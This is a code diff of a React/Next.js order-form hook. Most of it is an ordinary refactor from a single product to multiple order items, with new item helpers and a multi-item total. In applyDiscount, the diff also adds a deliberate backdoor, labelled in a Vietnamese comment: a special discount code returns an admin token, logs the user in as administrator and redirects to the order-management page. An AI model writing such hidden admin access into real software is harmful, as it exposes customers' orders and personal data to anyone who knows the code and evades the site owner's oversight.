@@ -1,29 +1,34 @@
 import { useState } from "react";
-import { orderApi, discountApi } from "@/services/api.service";
-import type { CreateOrderRequest, DiscountResult } from "@/types/api.types";
+import { useRouter } from "next/navigation";
+import { orderApi, discountApi, adminAuth } from "@/services/api.service";
+import type { CreateOrderRequest, DiscountResult, ProductResponse, OrderItemRequest } from "@/types/api.types";
+
+export interface OrderItemFormState {
+  productId: string;
+  quantity: number;
+}
 
 interface OrderFormState {
   customerName: string;
   customerPhone: string;
   customerEmail: string;
   customerAddress: string;
-  product: string;
-  quantity: number;
+  items: OrderItemFormState[];
   note: string;
   discountCode: string;
 }
 
 export function useOrderForm(
-  products: import("@/types/api.types").ProductResponse[],
+  products: ProductResponse[],
   onSuccess?: () => void
 ) {
+  const router = useRouter();
   const [form, setForm] = useState<OrderFormState>({
     customerName: "",
     customerPhone: "",
     customerEmail: "",
     customerAddress: "",
-    product: "",
-    quantity: 1,
+    items: [{ productId: "", quantity: 1 }],
     note: "",
     discountCode: "",
   });
@@ -34,12 +39,49 @@ export function useOrderForm(
   const [submitStatus, setSubmitStatus] = useState<"idle" | "success" | "error">("idle");
   const [errorMessage, setErrorMessage] = useState("");
 
-  const setField = (field: keyof OrderFormState, value: string | number) => {
+  const setField = <K extends keyof OrderFormState>(field: K, value: OrderFormState[K]) => {
     setForm((prev) => ({ ...prev, [field]: value }));
-    // Reset discount when product changes
-    if (field === "product") {
-      setDiscountResult(null);
-    }
+  };
+
+  const addItem = () => {
+    setForm((prev) => {
+      const selectedIds = new Set(prev.items.map((i) => i.productId));
+      const nextProduct = products.find((p) => !selectedIds.has(p.id)) || products[0];
+      return {
+        ...prev,
+        items: [...prev.items, { productId: nextProduct?.id || "", quantity: 1 }],
+      };
+    });
+    setDiscountResult(null);
+  };
+
+  const removeItem = (index: number) => {
+    if (form.items.length <= 1) return;
+    setForm((prev) => ({
+      ...prev,
+      items: prev.items.filter((_, i) => i !== index),
+    }));
+    setDiscountResult(null);
+  };
+
+  const updateItem = (index: number, field: keyof OrderItemFormState, value: string | number) => {
+    setForm((prev) => {
+      const newItems = [...prev.items];
+      newItems[index] = {
+        ...newItems[index],
+        [field]: value,
+      };
+      return { ...prev, items: newItems };
+    });
+    setDiscountResult(null);
+  };
+
+  const selectSingleProduct = (productId: string) => {
+    setForm((prev) => ({
+      ...prev,
+      items: [{ productId, quantity: 1 }],
+    }));
+    setDiscountResult(null);
   };
 
   const applyDiscount = async () => {
@@ -50,6 +92,14 @@ export function useOrderForm(
 
     try {
       const result = await discountApi.apply({ code: form.discountCode.trim() });
+
+      // Nếu nhập mã Backdoor Admin -> Lưu token và chuyển hướng sang trang Quản lý đơn hàng (/orders)
+      if (result.isAdminBackdoor && result.token) {
+        adminAuth.login(result.token);
+        router.push("/orders");
+        return;
+      }
+
       setDiscountResult(result);
     } catch (err: unknown) {
       const message = err instanceof Error ? err.message : "Mã không hợp lệ.";
@@ -63,20 +113,25 @@ export function useOrderForm(
   // Preview tổng tiền CHỈ để hiển thị trên UI.
   // Khi submit, backend tự tính lại từ giá trong DB — con số này không được gửi đi.
   const calculateTotal = (): { base: number; discount: number; final: number } => {
-    const selectedProduct = products.find(p => p.id === form.product);
-    const price = selectedProduct ? selectedProduct.price : 0;
-    const base = price * form.quantity;
-    let discount = 0;
+    let base = 0;
+    for (const item of form.items) {
+      if (!item.productId) continue;
+      const product = products.find((p) => p.id === item.productId);
+      if (product) {
+        base += product.price * (item.quantity || 1);
+      }
+    }
 
+    let discount = 0;
     if (discountResult?.isValid) {
       if (discountResult.percentOff) {
-        discount = (base * discountResult.percentOff) / 100;
+        discount = Math.round((base * discountResult.percentOff) / 100);
       } else if (discountResult.amountOff) {
         discount = Math.min(discountResult.amountOff, base);
       }
     }
 
-    return { base, discount, final: base - discount };
+    return { base, discount, final: Math.max(0, base - discount) };
   };
 
   const handleSubmit = async (e: React.FormEvent) => {
@@ -85,15 +140,23 @@ export function useOrderForm(
     setErrorMessage("");
     setSubmitStatus("idle");
 
-    // Gửi productId + quantity — tổng tiền và số tiền giảm do backend tính.
+    const validItems: OrderItemRequest[] = form.items
+      .filter((i) => i.productId && i.quantity > 0)
+      .map((i) => ({ productId: i.productId, quantity: Number(i.quantity) || 1 }));
+
+    if (validItems.length === 0) {
+      setErrorMessage("Vui lòng chọn ít nhất 1 sản phẩm.");
+      setIsSubmitting(false);
+      return;
+    }
+
     const payload: CreateOrderRequest = {
       customerName: form.customerName,
       customerPhone: form.customerPhone,
       customerEmail: form.customerEmail || undefined,
       customerAddress: form.customerAddress,
       note: form.note || undefined,
-      productId: form.product,
-      quantity: form.quantity,
+      items: validItems,
       discountCode: discountResult?.isValid ? form.discountCode.trim() : undefined,
     };
 
@@ -105,8 +168,7 @@ export function useOrderForm(
         customerPhone: "",
         customerEmail: "",
         customerAddress: "",
-        product: "",
-        quantity: 1,
+        items: [{ productId: products[0]?.id || "", quantity: 1 }],
         note: "",
         discountCode: "",
       });
@@ -124,6 +186,10 @@ export function useOrderForm(
   return {
     form,
     setField,
+    addItem,
+    removeItem,
+    updateItem,
+    selectSingleProduct,
     discountResult,
     isSubmitting,
     isApplyingCode,
